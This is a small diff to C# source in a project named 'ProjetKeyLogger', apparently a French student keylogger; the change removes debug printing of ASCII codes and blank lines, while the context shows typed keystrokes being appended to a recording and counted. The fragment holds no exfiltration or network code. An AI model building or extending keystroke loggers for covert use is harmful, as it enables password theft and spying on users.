@@ -288,17 +288,15 @@ namespace ProjetKeyLogger
                                     }
                                     else
                                     {
-                                        Console.Write(Char.ToLower((char)codeASCII) + "" + codeASCII);
+                                        Console.Write(Char.ToLower((char)codeASCII));
                                     }
                                 }
-                                
                                 
                                 //Concatenation e la derniere touche tapée au contenu de l'enregistrement
                                 enregistrement.ajouterContenu((char)codeASCII);
                                 //Sinon on incrémente le nombre de caracteres tapé
                                 nb_caractere_tape += 1;
                                 break;
-
                         }
 
                        
